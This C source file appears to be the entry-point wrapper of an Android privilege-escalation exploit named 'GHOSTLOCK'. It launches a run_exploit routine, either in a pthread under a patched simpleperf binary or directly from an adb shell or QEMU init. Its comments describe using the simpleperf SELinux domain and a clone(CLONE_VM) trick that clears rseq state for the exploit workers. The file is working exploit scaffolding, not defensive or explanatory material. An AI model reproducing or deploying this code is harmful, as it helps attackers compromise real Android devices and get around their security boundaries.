#include "common.h"

#ifdef GHOSTLOCK_SIMPLEPERF_PATCH
#include <pthread.h>
#include <stdint.h>

struct exploit_arguments {
  int count;
  char **values;
};

static void *run_exploit_thread(void *opaque_arguments) {
  struct exploit_arguments *arguments =
      (struct exploit_arguments *)opaque_arguments;
  int result = run_exploit(arguments->count, arguments->values);
  return (void *)(intptr_t)result;
}

int main(int argc, char **argv) {
  struct exploit_arguments arguments = {
      .count = argc,
      .values = argv,
  };
  pthread_t exploit_thread;

  /*
   * A patched /system/bin/simpleperf starts in the simpleperf SELinux domain,
   * but still inherits the app's seccomp filter. clone(CLONE_VM) clears rseq
   * for this pthread, and all exploit workers inherit that clean state.
   */
  if (pthread_create(&exploit_thread, NULL, run_exploit_thread, &arguments)) {
    return 158;
  }

  void *thread_result = NULL;
  if (pthread_join(exploit_thread, &thread_result)) {
    return 157;
  }
  return (int)(intptr_t)thread_result;
}
#else
/* Standalone entry point: the exploit binary is invoked directly
 * (QEMU /init wrapper or adb shell); no LD_PRELOAD path exists. */
int main(int argc, char **argv) {
  return run_exploit(argc, argv);
}
#endif
